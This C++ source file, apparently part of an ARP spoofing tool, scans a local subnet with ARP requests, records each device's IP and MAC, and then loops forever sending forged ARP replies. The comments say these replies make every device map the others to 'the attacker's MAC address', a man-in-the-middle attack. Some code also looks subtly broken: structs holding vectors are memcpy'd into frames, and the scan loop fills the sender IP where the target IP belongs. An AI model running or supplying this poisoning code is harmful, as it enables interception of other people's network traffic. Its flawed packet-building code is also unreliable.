#include "arp.hpp"

/*
Save the available devices' IP and MAC into IP-MAC pair
Print the available devices' IP and MAC
*/
void parseARPReply(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, struct LocalInfo local_info) {
    arp_hdr *arphdr = (arp_hdr *)(buffer + ETH_HDRLEN);

    // Check if ARP packet is a response
    if (ntohs(arphdr->opcode) == ARPOP_REPLY) {
        // If the IP address is the gateway IP, return
        if (arphdr->sender_ip[0] == (local_info.gateway_ip.sin_addr.s_addr & 0xff) &&
            arphdr->sender_ip[1] == ((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff) &&
            arphdr->sender_ip[2] == ((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff) &&
            arphdr->sender_ip[3] == ((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)) {
            ip_mac_pairs[arphdr->sender_ip] = arphdr->sender_mac;
            return;
        }

        // If the IP address is local IP, return
        if (arphdr->sender_ip[0] == (local_info.src_ip.sin_addr.s_addr & 0xff) &&
            arphdr->sender_ip[1] == ((local_info.src_ip.sin_addr.s_addr >> 8) & 0xff) &&
            arphdr->sender_ip[2] == ((local_info.src_ip.sin_addr.s_addr >> 16) & 0xff) &&
            arphdr->sender_ip[3] == ((local_info.src_ip.sin_addr.s_addr >> 24) & 0xff)) {
            return;
        }

        // If the IP address has already in the ip_mac_pairs, return
        if (ip_mac_pairs.find(arphdr->sender_ip) != ip_mac_pairs.end()) {
            return;
        }
        // Save IP-MAC pair
        ip_mac_pairs[arphdr->sender_ip] = arphdr->sender_mac;

        // Print source IP address
        printf("%d.%d.%d.%d\t\t", arphdr->sender_ip[0], arphdr->sender_ip[1], arphdr->sender_ip[2], arphdr->sender_ip[3]);
        // Print source MAC address
        for (int i = 0; i < 5; i++) {
            printf("%02x:", arphdr->sender_mac[i]);
        }
        printf("%02x\n", arphdr->sender_mac[5]);
    }
}

/*
Function to send fake ARP replies
Make the devices in the IP-MAC pair think that the other devices' MAC address is the attacker's MAC address
 */
void sendSpoofedARPReply(int sd, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, struct LocalInfo local_info) {
    arp_hdr arphdr;
    arphdr.htype = htons(1);                    // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);             // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                            // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                            // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REPLY);         // OpCode: 2 for ARP reply
    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
    std::vector<uint8_t> ether_frame(IP_MAXPACKET);

    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    while (true) {
        for (auto i = ip_mac_pairs.begin(); i != ip_mac_pairs.end(); i++) {
            for (auto j = ip_mac_pairs.begin(); j != ip_mac_pairs.end(); j++) {
                if (i == j) continue;  // Skip sending to self

                // Construct and send fake ARP reply
                arphdr.sender_mac.assign(local_info.src_mac.begin(), local_info.src_mac.end());
                arphdr.sender_ip.assign(j->first.begin(), j->first.end());
                arphdr.target_mac.assign(i->second.begin(), i->second.end());
                arphdr.target_ip.assign(i->first.begin(), i->first.end());

                // Destination and Source MAC addresses
                std::copy(i->second.begin(), i->second.end(), ether_frame.begin());
                std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), ether_frame.begin() + 6);

                // ARP header
                memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

                // Send ethernet frame to socket.
                if (sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));  // Sleep for a while
    }
}

/*
Function to send ARP request to the whole subnet
Used to get the MAC address and IP of all devices in the subnet
*/
void sendARPRequest(int sd, struct LocalInfo local_info) {
    int frame_length;
    int bytes;
    arp_hdr arphdr;
    std::vector<uint8_t> dst_mac(6, 0xff);
    std::vector<uint8_t> ether_frame(IP_MAXPACKET);

    // Copy IP address from sockaddr_in to sender_ip
    uint8_t* local_ip = reinterpret_cast<uint8_t *>(&local_info.src_ip.sin_addr.s_addr);
    arphdr.sender_ip.assign(local_ip, local_ip + 4);
    // std::copy_n(reinterpret_cast<uint8_t *>(&local_info.src_ip.sin_addr.s_addr), 4, arphdr.sender_ip.begin());

    // Fill out sockaddr_ll.
    local_info.device.sll_family = AF_PACKET;
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), local_info.device.sll_addr);
    local_info.device.sll_halen = htons(6);

    // ARP header
    arphdr.htype = htons(1);                                                                     // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);                                                              // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                                                                             // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                                                                             // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REQUEST);                                                        // OpCode: 1 for ARP request
    arphdr.sender_mac.assign(local_info.src_mac.begin(), local_info.src_mac.end());
    // std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), arphdr.sender_mac.begin());  // Sender hardware address (48 bits): MAC address
    arphdr.target_mac.assign(6, 0);                                                                   // Target hardware address (48 bits): zero

    // Fill out ethernet frame header.
    frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

    // Destination and Source MAC addresses
    std::copy(dst_mac.begin(), dst_mac.end(), ether_frame.begin());
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), ether_frame.begin() + 6);

    // Ethernet type code (ETH_P_ARP for ARP).
    // http://www.iana.org/assignments/ethernet-numbers
    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    uint32_t base_ip_net = ntohl(local_info.src_ip.sin_addr.s_addr) & ntohl(local_info.netmask.sin_addr.s_addr);
    uint32_t mask_net = ntohl(~local_info.netmask.sin_addr.s_addr);

    for (uint32_t i = 1; i < mask_net; i++) {
        uint32_t dest_ip = htonl(base_ip_net | i);

        uint8_t* dest_ip8 = reinterpret_cast<uint8_t *>(&dest_ip);
        arphdr.sender_ip.assign(dest_ip8, dest_ip8 + 4);
        // std::copy_n(reinterpret_cast<uint8_t *>(&dest_ip), 4, arphdr.target_ip.begin());
        // ARP header
        memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));
        // Send ethernet frame to socket.
        if ((bytes = sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device))) <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
    }
}